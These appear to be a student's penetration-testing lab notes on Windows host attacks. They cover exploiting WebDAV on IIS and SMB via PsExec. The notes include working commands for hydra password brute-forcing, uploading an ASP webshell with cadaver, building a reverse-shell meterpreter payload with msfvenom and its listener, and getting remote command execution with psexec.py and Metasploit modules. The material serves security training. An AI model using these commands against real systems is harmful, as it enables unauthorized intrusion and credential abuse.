## System/Host-based attacks
#Systemattacks #hostbasedattacks

- Looking at exploiting the system itself (Windows/Linux)
- Usually done after a network exploit (after gaining access to the network)
- Attacks are focused on exploiting inherent vulns in misconfigured OS 
- Useful when attacking a host (eg some random employee latop connected to the server which you prev accessed using a network attack)
- The host might not be running anyt except SMB (or other stuff natively built into windows ) to file share with the server, so understanding of windows is necessary
- impt for exploits where hosts do not have typical public-facing services running (HTTP/HTTPS etc)

Outline:
- Windows/Linux
	- Overview of vulns
	- Exploit these vulns
	- Priveledge escalation 
		- kernal exploitation/impersonation
	- File system vulns
	- Credential dumping
	- Lateral movement 
		- Use of credentials found to move between targets

# Windows
### Overview:
Common vulns
MS08-067(Conflicker) to MS17-010 (Eternal Blue)

Lots of legacy versions exist, fragmented nature of companies with diff unpatched vers leaves vuln

Built on C so vulnerable to common exploits:
- buffer overflow
- arbitrary code exec etc
Default install is not built to be secure (even in windows 10 etc)
Endpt protection has to be handled by the company (antivirus/firewall settings etc)

Common exploited services native to windows:
| Protocol/Service                                  | Default Ports        | Purpose                                                                         |
| ------------------------------------------------- | ------------ | ------------------------------------------------------------------------------- |
| Microsoft IIS (internet Information system)       | TCP 80/443   | Proprietary server software that runs on windows                                |
| WebDAV (web distributed authoring and versioning) | TCP 80/443   | HTTP extenstion allows web server to act as a file server                       |
| SMB/CIFS                                          | TCP 445      | Network file sharing and peripherals between computers on a LAN (eg Printers)                 |
| RDP                                               | TCP 3389     | Proprietary GUI used to remotely authenticate and interact with windows systems |
| WinRM (Remote management)                         | TCP 5986/443 | Remote management protocol for remote access to windows systems                 |
|                                                   |              |                                                                                 |


### Exploit WevDAV running on Microsoft IIS
#webdav
- IIS is a windows webserver. Functions like any web server (eg Apache or Nginx)
- Can be used for static/dynamis webpages
- developed in asp.net and PHP (can be set up to host asp or php web applicaiton)

- WebDav allows web server to function as a file server (like FTP) to allow collaborative editing etc
- Without SSL cert it runs on port 80 else with SSL it runs on 443 (ie http vs https)
- After bruteforcing auth, malicious ASP payload can be uploaded and executed  to create a reverse shell
Tools:
davtest - USed to scan auth and expl webDAV erver
cadaver - file upload/dl on-screen disp etc etc

Lab:
nmap script http-enum to scan the server
hydra to brute force auth in the /webdav/ directory found
```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
```
Davtest to see wat types of files can be uploaded
```bash
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```
From the test prev, Txt,Asp and http files can be executed
So
Cadaver used to upload Rev shell
```bash
cadaver http://10.2.123.123/webdav
#enter username and password
#enumerate like a normal ftp server
```
Kali comes with some webshells found at:
ls -al /usr/share/webshells/

- Upload the asp shell found into the webdav server using cadaver
```cadaver
put /usr/share/webshells/asp/webshell.asp
```
Viewing the directory on the browser the webshell should be there for u to open.
Can run code in the box to execute commands on the target system
type c:\\flag.txt

#### Exploit using msf instead
1.msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2
LPORT=1234
-f asp > shell.asp
```
Note: 32 bit is usally used as it works for both 32 and 64 bit if u dont know the target servers specification

2.Cadaver to upload shell.asp (seen above)
Clicking the shell.asp in /webdav/ executes the payload, b4 that set up listener in msfconsole

```bash
#starts metasploit and metasploit framework database (Pretty sure it starts itself but idk?? yea...dont need the front part)
service postgresql start && msfconsole
```

```bash
#set options to match the msfvenom payload
use multi/handler
set payload windows/meterpreter/reverse_tcp
set port 1234
```

2b. Or use windows/iis/iis_webdav_uplaod_asp in msfconsole to upload (everything done on its own, even deletes the payload after)

```msf
#slightly tricky
set PATH webdav/matasploit%RAND%.asp
```

### Exploit SMB running on Microsoft IIS with PsExec
#smb
SMB intro
- 2 level authentication
	1. User authentication (pword+user)
	2. Share authentication (pword to access share)
- Utilise a challenge response auth system (encrypted string is sent back to match the servers) (ie the pword used)

PsExec intro
- Microsofts lightweight replacement for telnet to execute processes remotely
- auth is performed via SMB
- similar to RDP but without GUI (ie only tru CMD)
- It is a windows util so doesnt work in linux (unless u use wine), SO 
- psexec.py is used instead --> python tool same as psexec
- ^ its a Impacket tool wow
```bash
#authenticate user
psexec.py Administrator@10.2.24.221 cmd.exe
#you will be prompted for password
```
- Very clean as its a legit login (no malicious files etc)

To get auth
- SMB brute force
	- can narrow down users to administrator (every server has this acct)
	- smb_login on msf with 
	- /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
If want meterpreter
- exploit/windows/smb/psexec
- Enter creds found
-  run
